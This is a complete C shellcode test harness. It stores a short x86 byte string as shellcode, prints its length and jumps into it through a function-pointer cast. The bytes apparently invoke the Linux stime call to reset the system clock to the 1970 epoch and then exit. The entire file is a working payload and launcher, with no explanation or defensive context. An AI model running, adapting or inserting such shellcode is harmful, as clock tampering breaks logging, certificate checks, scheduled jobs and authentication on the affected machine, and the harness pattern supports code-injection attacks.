#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\xb0\x19\x99\x52\x89\xe3\xcd\x80\xfe\xc0\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
